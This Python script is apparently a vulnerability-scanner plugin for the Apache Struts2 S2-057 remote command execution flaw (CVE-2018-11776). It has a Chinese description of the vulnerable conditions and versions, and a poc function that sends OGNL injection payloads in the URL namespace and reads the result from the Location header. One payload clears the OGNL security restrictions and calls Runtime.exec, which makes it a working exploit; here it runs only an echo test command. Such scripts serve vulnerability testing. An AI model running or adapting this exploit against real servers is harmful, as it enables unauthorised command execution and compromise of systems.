#!/usr/bin/env python		
# coding:utf-8

"""
Struts2 S2-057 远程命令执行漏洞（CVE-2018-11776）

Desc
    当Struts2的配置满足以下条件时：

     - alwaysSelectFullNamespace值为true
     - action元素未设置namespace属性，或使用了通配符

    namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。回显位置在headers中的Location字段中。
Version
    小于等于 Struts 2.3.34 与 Struts 2.5.16
Referer
    - https://cwiki.apache.org/confluence/display/WW/S2-057
    - https://lgtm.com/blog/apache_struts_CVE-2018-11776
    - https://xz.aliyun.com/t/2618
    - https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg
"""
import requests
from six.moves.urllib import parse


def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')

    command = "echo rivirsirfortest"
    payloads = [
        # 验证POC
        "${233*233}",
        # 命令执行poc
        "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('%s')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}" % command
    ]
    for payload in payloads:
        try:
            if url.endswith(".action"):
                _url, _, _file = url.rpartition("/")
                vulurl = _url + "/%s/" % parse.quote(payload) + _file
            else:
                vulurl = url + "/%s/index.action" % payload
            resp = requests.get(vulurl, allow_redirects=False, timeout=10)
            location = resp.headers.get("Location", "")
            if "54289" in location:
                return True
            if "rivirsirfortest" in location:
                return True
        except Exception as e:
            pass
    return False


if __name__ == '__main__':
    print poc("http://vuln.com:8080/struts2-showcase/actionChain1.action")
